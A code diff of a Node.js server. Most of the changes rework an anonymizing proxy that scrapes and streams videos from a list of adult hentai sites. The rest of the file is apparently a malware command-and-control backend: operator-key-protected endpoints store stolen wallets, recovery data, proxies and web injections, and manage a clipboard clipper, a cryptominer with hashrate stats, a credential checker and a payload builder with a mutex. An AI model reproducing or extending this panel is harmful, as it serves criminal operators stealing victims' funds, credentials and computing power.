@@ -1,13 +1,10 @@
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
+const path = require('path');
 const https = require('https');
 const httpNative = require('http');
 const { URL } = require('url');
-const { spawn } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-const os = require('os');
 
 const app = express();
 const server = http.createServer(app);
@@ -15,18 +12,22 @@ const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 })
 
 const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
 const PORT = process.env.PORT || 3000;
-const YTDLP_PATH = process.env.YTDLP_PATH || 'yt-dlp';
 
 const clients = new Map();
 const operators = new Set();
-const anonymousCache = new Map(); // pageUrl -> { filePath, createdAt, size, sources }
 
 const db = {
-  recovery: [], wallets: [], proxy: [],
+  recovery: [],
+  wallets: [],
+  proxy: [],
   clipper: { entries: [], enabled: false },
-  webinjection: [], sorter: [], autotasks: [], filestore: [],
+  webinjection: [],
+  sorter: [],
+  autotasks: [],
+  filestore: [],
   miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
-  checker: { configs: [] }, checkersessions: [],
+  checker: { configs: [] },
+  checkersessions: [],
   builder: {
     clientTag: 'Guest', note: '',
     mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
@@ -38,7 +39,6 @@ const db = {
 };
 
 app.use(express.json({ limit: '100mb' }));
-app.use(express.static(path.join(__dirname), { index: false }));
 
 app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
 app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
@@ -47,71 +47,106 @@ app.get('/socket.io/socket.io.js', (req, res) =>
   res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
 );
 
-/* ===== Anonymous proxy: allowed source host ===== */
-const ALLOWED_HOSTS = ['hentai.pro'];
+/* ===== Anonymous video proxy =====
+   Visitor -> Render -> source CDN. Source never sees visitor IP.
+   Range requests pass through. Only http(s). Only allowlisted hosts. */
+const ALLOWED_HOSTS = new Set([
+  'hentai.pro',
+  'www.hentai.pro',
+  'cdn.hentai.pro',
+  'v.hentai.pro',
+  'media.hentai.pro',
+  'hentai-pro.com',
+  'www.hentai-pro.com',
+  'cdn.hentai-pro.com',
+  'hentaimama.io',
+  'www.hentaimama.io',
+  'cdn.hentaimama.io',
+  'hentaigem.com',
+  'www.hentaigem.com',
+  'cdn.hentaigem.com',
+  'hentaicity.com',
+  'www.hentaicity.com',
+  'cdn.hentaicity.com',
+  'hentaihaven.xxx',
+  'www.hentaihaven.xxx',
+  'cdn.hentaihaven.xxx',
+  'hanime.tv',
+  'www.hanime.tv',
+  'cdn.hanime.tv',
+  'v.hanime.tv',
+  'stream.hanime.tv',
+  'hentai.tv',
+  'www.hentai.tv',
+  'cdn.hentai.tv'
+]);
 
 function isAllowedHost(host) {
   if (!host) return false;
   const h = host.toLowerCase();
-  return ALLOWED_HOSTS.some(a => h === a || h.endsWith('.' + a));
+  if (ALLOWED_HOSTS.has(h)) return true;
+  for (const allowed of ALLOWED_HOSTS) {
+    if (h.endsWith('.' + allowed)) return true;
+  }
+  return false;
 }
 
-function runYtDlp(args, onChunk, onDone) {
-  const proc = spawn(YTDLP_PATH, args, { stdio: ['ignore', 'pipe', 'pipe'] });
-  let stderr = '';
-  proc.stdout.on('data', d => onChunk && onChunk(d.toString()));
-  proc.stderr.on('data', d => { stderr += d.toString(); });
-  proc.on('close', (code) => onDone(code, stderr));
-  proc.on('error', (err) => onDone(-1, err.message));
-  return proc;
-}
+function fetchBuffer(targetUrl, { timeout = 12000, redirects = 5, headers = {} } = {}) {
+  return new Promise((resolve, reject) => {
+    const attempt = (url, n) => {
+      if (n > redirects) return reject(new Error('too many redirects'));
+      let u;
+      try { u = new URL(url); } catch { return reject(new Error('bad url')); }
+      if (u.protocol !== 'http:' && u.protocol !== 'https:') return reject(new Error('bad protocol'));
+      if (!isAllowedHost(u.hostname)) return reject(new Error('host not allowed'));
 
-/* Resolve direct media URL from a watch page via yt-dlp (server-side). */
-function resolveViaYtDlp(pageUrl, cb) {
-  const args = ['-g', '-f', 'best[ext=mp4]/best', '--no-playlist', '--no-warnings', pageUrl];
-  runYtDlp(args, null, (code, err) => {
-    if (code !== 0) return cb(new Error('yt-dlp failed: ' + err));
-    // args output may contain multiple lines (video + audio). Take first for mp4.
-    // We'll instead run again without -g and just get direct url list.
-    cb(null, null);
+      const lib = u.protocol === 'https:' ? https : httpNative;
+      const req = lib.get({
+        protocol: u.protocol,
+        hostname: u.hostname,
+        port: u.port || undefined,
+        path: u.pathname + u.search,
+        headers: {
+          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
+          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+          'Accept-Language': 'en-US,en;q=0.9',
+          'Referer': u.origin + '/',
+          ...headers
+        }
+      }, (res) => {
+        if ([301,302,303,307,308].includes(res.statusCode) && res.headers.location) {
+          let next = res.headers.location;
+          try { next = new URL(next, u).toString(); } catch {}
+          res.resume();
+          return attempt(next, n + 1);
+        }
+        const chunks = [];
+        res.on('data', c => chunks.push(c));
+        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: Buffer.concat(chunks) }));
+      });
+      req.setTimeout(timeout, () => { req.destroy(new Error('timeout')); });
+      req.on('error', reject);
+    };
+    attempt(targetUrl, 0);
   });
 }
 
-/* Get direct mp4 (best) via yt-dlp json. */
-function getDirectUrl(pageUrl, cb) {
-  const args = ['-j', '--no-playlist', '--no-warnings', pageUrl];
-  let out = '';
-  runYtDlp(args, (chunk) => { out += chunk; }, (code, err) => {
-    if (code !== 0) return cb(new Error('yt-dlp json failed: ' + err));
-    try {
-      const meta = JSON.parse(out.trim().split('\n').pop());
-      // Prefer an mp4 with both audio+video
-      let url = meta.url;
-      if (meta.requested_formats) {
-        const mp4 = meta.requested_formats.find(f => (f.ext === 'mp4') && f.acodec && f.acodec !== 'none' && f.vcodec && f.vcodec !== 'none');
-        if (mp4) url = mp4.url;
-      }
-      cb(null, url, meta);
-    } catch (e) { cb(new Error('parse: ' + e.message)); }
-  });
-}
-
-/* Proxy any binary stream through Render. */
 function pipeStream(targetUrl, req, res, redirects = 0) {
-  if (redirects > 5) return res.status(508).end();
+  if (redirects > 5) { res.status(508).end(); return; }
   let u;
-  try { u = new URL(targetUrl); } catch { return res.status(400).end(); }
-  if (u.protocol !== 'http:' && u.protocol !== 'https:') return res.status(400).end();
-  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });
+  try { u = new URL(targetUrl); } catch { res.status(400).end(); return; }
+  if (u.protocol !== 'http:' && u.protocol !== 'https:') { res.status(400).end(); return; }
+  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }
 
   const lib = u.protocol === 'https:' ? https : httpNative;
   const headers = {
-    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
+    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36',
     'Accept': req.headers['accept'] || '*/*',
     'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
     'Referer': u.origin + '/'
   };
   if (req.headers['range']) headers['Range'] = req.headers['range'];
+  if (req.headers['if-range']) headers['If-Range'] = req.headers['if-range'];
 
   const proxyReq = lib.request({
     protocol: u.protocol,
@@ -125,129 +160,157 @@ function pipeStream(targetUrl, req, res, redirects = 0) {
       let next = proxyRes.headers.location;
       try { next = new URL(next, u).toString(); } catch {}
       proxyRes.resume();
-      return pipeStream(next, req, res, redirects + 1);
+      pipeStream(next, req, res, redirects + 1);
+      return;
     }
-    const pass = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
-    pass.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
+    const passthrough = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
+    passthrough.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Headers', 'Range');
     res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
     res.status(proxyRes.statusCode || 200);
     proxyRes.pipe(res);
   });
-  proxyReq.on('error', () => { try { res.status(502).end(); } catch {} });
+
+  proxyReq.on('error', () => { try { if (!res.headersSent) res.status(502).end(); } catch {} });
   req.on('close', () => proxyReq.destroy());
   proxyReq.end();
 }
 
-/* Fetch HTML and rewrite all hentai.pro links to go through /api/anonymous. */
+/* Fetch the watch page HTML and rewrite it so it can be embedded safely.
+   All absolute https://hentai.pro URLs are converted into /api/anonymous/... links. */
 function rewriteHtml(html, baseUrl) {
   const base = new URL(baseUrl);
   const origin = base.origin;
-  const proxy = '/api/anonymous?u=';
-  html = html.replace(/(href|src|data-src|poster|action)=("|')(https?:\/\/(?:[^"']*\.)?hentai\.pro[^"']*)\2/gi,
-    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent(url)}${q}`);
-  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/\/[^"']*\.hentai\.pro[^"']*)\2/gi,
-    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent('https:' + url)}${q}`);
-  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
-    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent(origin + url)}${q}`);
+  const proxyPrefix = '/api/anonymous?u=';
+  const hostRe = '(?:[^"\'\\s]*\\.)?' + base.hostname.replace(/\./g, '\\.');
+
+  html = html.replace(
+    new RegExp('(href|src|data-src|poster|action)=("|\')(https?:\\/\\/' + hostRe + '[^"\']*)\\2', 'gi'),
+    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(url)}${q}`
+  );
+  html = html.replace(
+    new RegExp('(href|src|data-src|poster|action)=("|\')(\\/\\/' + hostRe + '[^"\']*)\\2', 'gi'),
+    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent('https:' + url)}${q}`
+  );
+  html = html.replace(
+    /(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
+    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(origin + url)}${q}`
+  );
   return html;
 }
 
-/* Resolve watch page -> { title, thumbnail, sources: [mp4 urls] } */
-app.post('/api/anonymous/resolve', (req, res) => {
-  const { url } = req.body || {};
-  if (!url) return res.status(400).json({ error: 'missing url' });
-  let u;
-  try { u = new URL(url); } catch { return res.status(400).json({ error: 'bad url' }); }
-  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });
+/* Extract direct media URLs from a watch page */
+function extractSources(html, baseUrl) {
+  const base = new URL(baseUrl);
+  const found = new Map(); // url -> type priority (lower = better)
 
-  const args = ['-j', '--no-playlist', '--no-warnings', url];
-  let out = '';
-  runYtDlp(args, (chunk) => { out += chunk; }, (code, err) => {
-    if (code !== 0) return res.status(502).json({ error: 'yt-dlp failed', detail: err });
-    try {
-      const meta = JSON.parse(out.trim().split('\n').pop());
-      const sources = [];
-      if (meta.url) sources.push(meta.url);
-      if (meta.formats) {
-        meta.formats.filter(f => f.ext === 'mp4' && f.vcodec && f.vcodec !== 'none' && f.acodec && f.acodec !== 'none')
-          .forEach(f => sources.push(f.url));
-        meta.formats.filter(f => f.ext === 'm3u8').forEach(f => sources.push(f.url));
-      }
-      const uniq = [...new Set(sources)].filter(s => { try { return isAllowedHost(new URL(s).hostname); } catch { return false; } });
-      res.json({
-        title: meta.title || 'video',
-        thumbnail: meta.thumbnail || '',
-        duration: meta.duration || 0,
-        sources: uniq
-      });
-    } catch (e) {
-      res.status(502).json({ error: 'parse', detail: e.message });
-    }
-  });
-});
+  const add = (raw, priority) => {
+    if (!raw) return;
+    let abs;
+    try { abs = new URL(raw, base).toString(); } catch { return; }
+    let host;
+    try { host = new URL(abs).hostname; } catch { return; }
+    if (!isAllowedHost(host)) return;
+    if (!/\.(m3u8|mp4|webm|mkv|m4v|mov|ts)(\?|#|$)/i.test(abs)) return;
+    const existing = found.get(abs);
+    if (existing === undefined || priority < existing) found.set(abs, priority);
+  };
 
-/* Stream a resolved direct URL through Render (visitor never sees hentai.pro). */
-app.get('/api/anonymous/stream', (req, res) => {
+  // 1. <source src="...">
+  let m;
+  const reSource = /<source[^>]+src=["']([^"']+)["']/gi;
+  while ((m = reSource.exec(html)) !== null) add(m[1], 1);
+
+  // 2. <video src="...">
+  const reVideo = /<video[^>]+src=["']([^"']+)["']/gi;
+  while ((m = reVideo.exec(html)) !== null) add(m[1], 1);
+
+  // 3. <video><source ... /></video> with data-src
+  const reDataSrc = /<source[^>]+data-src=["']([^"']+)["']/gi;
+  while ((m = reDataSrc.exec(html)) !== null) add(m[1], 2);
+
+  // 4. JSON-ish keys: file:"...", source:"...", src:"...", url:"...", videoUrl:"..."
+  const reJson = /(?:file|source|src|url|videoUrl|video_url|playlist|hls|mp4|stream)\s*[:=]\s*["']([^"']+\.(?:m3u8|mp4|webm|mkv|m4v|mov)[^"']*)["']/gi;
+  while ((m = reJson.exec(html)) !== null) add(m[1], 3);
+
+  // 5. Bare absolute URLs
+  const reAbs = /https?:\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi;
+  while ((m = reAbs.exec(html)) !== null) add(m[0], 4);
+
+  // 6. Protocol-relative
+  const reProto = /\/\/[^"'\\\s<>()]+?\.(?:m3u8|mp4|webm|mkv|m4v|mov)(?:[^"'\\\s<>()]*)/gi;
+  while ((m = reProto.exec(html)) !== null) add('https:' + m[0], 5);
+
+  const list = [...found.entries()].sort((a, b) => a[1] - b[1]).map(([u]) => u);
+  return list;
+}
+
+app.get('/api/anonymous', async (req, res) => {
   const target = req.query.u;
-  if (!target) return res.status(400).end();
-  // Only allow streaming from the CDN hosts yt-dlp returns (all under hentai.pro family).
+  if (!target) { res.status(400).json({ error: 'missing u' }); return; }
   let u;
-  try { u = new URL(target); } catch { return res.status(400).end(); }
-  if (!isAllowedHost(u.hostname)) return res.status(403).end();
-  pipeStream(target, req, res);
-});
-
-/* Generic proxy used when the visitor navigates inside the embedded iframe. */
-app.get('/api/anonymous', (req, res) => {
-  const target = req.query.u;
-  if (!target) return res.status(400).end();
-  let u;
-  try { u = new URL(target); } catch { return res.status(400).end(); }
-  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });
+  try { u = new URL(target); } catch { res.status(400).end(); return; }
+  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }
 
   const accept = req.headers['accept'] || '';
-  const wantsHtml = accept.includes('text/html');
-  const hasRange = !!req.headers['range'];
-  const looksVideo = /\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|$)/i.test(u.pathname + u.search);
+  const wantsHtml = accept.includes('text/html') || (!req.headers['range'] && !/\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|$)/i.test(u.pathname + u.search));
 
-  if (hasRange || looksVideo) return pipeStream(target, req, res);
+  if (!wantsHtml) { pipeStream(target, req, res); return; }
 
-  if (wantsHtml) {
-    const lib = u.protocol === 'https:' ? https : httpNative;
-    const r = lib.get({
-      protocol: u.protocol, hostname: u.hostname, port: u.port || undefined,
-      path: u.pathname + u.search,
-      headers: {
-        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
-        'Accept': 'text/html,application/xhtml+xml',
-        'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
-        'Referer': u.origin + '/'
-      }
-    }, (r2) => {
-      if ([301,302,303,307,308].includes(r2.statusCode) && r2.headers.location) {
-        let next = r2.headers.location;
-        try { next = new URL(next, u).toString(); } catch {}
-        r2.resume();
-        return res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
-      }
-      const chunks = [];
-      r2.on('data', c => chunks.push(c));
-      r2.on('end', () => {
-        const body = Buffer.concat(chunks).toString('utf8');
-        res.setHeader('Content-Type', 'text/html; charset=utf-8');
-        res.setHeader('Access-Control-Allow-Origin', '*');
-        res.send(rewriteHtml(body, target));
-      });
-    });
-    r.on('error', () => { try { res.status(502).end(); } catch {} });
-    return;
+  try {
+    const r = await fetchBuffer(target);
+    if ([301,302,303,307,308].includes(r.status) && r.headers.location) {
+      let next = r.headers.location;
+      try { next = new URL(next, u).toString(); } catch {}
+      res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
+      return;
+    }
+    const body = r.body.toString('utf8');
+    const rewritten = rewriteHtml(body, target);
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.send(rewritten);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ error: 'upstream fetch failed', detail: String(e.message || e) });
   }
+});
+
+/* JSON resolver: given a watch page URL, return direct video sources */
+app.post('/api/anonymous/resolve', async (req, res) => {
+  const { url } = req.body || {};
+  if (!url) { res.status(400).json({ error: 'missing url' }); return; }
+  let u;
+  try { u = new URL(url); } catch { res.status(400).json({ error: 'bad url' }); return; }
+  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }
+
+  try {
+    const r = await fetchBuffer(url);
+    const html = r.body.toString('utf8');
+    const sources = extractSources(html, url);
+
+    // Also rewrite the page and scan rewritten for embedded iframes pointing at allowlisted players
+    const rewritten = rewriteHtml(html, url);
+    const iframeSrcs = new Set();
+    let m;
+    const reIframe = /<iframe[^>]+src=["']([^"']+)["']/gi;
+    while ((m = reIframe.exec(rewritten)) !== null) {
+      iframeSrcs.add(m[1]);
+    }
+
+    res.json({ sources, iframes: [...iframeSrcs], html: rewritten.length });
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ error: 'fetch failed', detail: String(e.message || e) });
+  }
+});
+
+/* Endpoint used by the visitor player — always fetches via Render's outbound IP */
+app.get('/api/anonymous/stream', (req, res) => {
+  const target = req.query.u;
+  if (!target) { res.status(400).end(); return; }
   pipeStream(target, req, res);
 });
 
-/* ===== Operator auth + collections ===== */
 function auth(req, res, next) {
   const key = req.headers['x-operator-key'] || req.query.key;
   if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
@@ -277,16 +340,21 @@ function collection(name) {
     res.json({ ok: true });
   });
 }
+
 ['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);
 
 app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
 app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });
+
 app.get('/api/miner', auth, (req, res) => res.json(db.miner));
 app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });
+
 app.get('/api/checker', auth, (req, res) => res.json(db.checker));
 app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });
+
 app.get('/api/builder', auth, (req, res) => res.json(db.builder));
 app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });
+
 app.post('/api/builder/build', auth, (req, res) => {
   const build = {
     id: Date.now().toString(36),
@@ -299,10 +367,15 @@ app.post('/api/builder/build', auth, (req, res) => {
   db.builder.builds = db.builder.builds.slice(0, 10);
   res.json(build);
 });
+
 app.get('/api/stats', auth, (req, res) => {
   res.json({
-    clients: clients.size, recovery: db.recovery.length, wallets: db.wallets.length,
-    proxy: db.proxy.length, filestore: db.filestore.length, checkersessions: db.checkersessions.length
+    clients: clients.size,
+    recovery: db.recovery.length,
+    wallets: db.wallets.length,
+    proxy: db.proxy.length,
+    filestore: db.filestore.length,
+    checkersessions: db.checkersessions.length
   });
 });
 
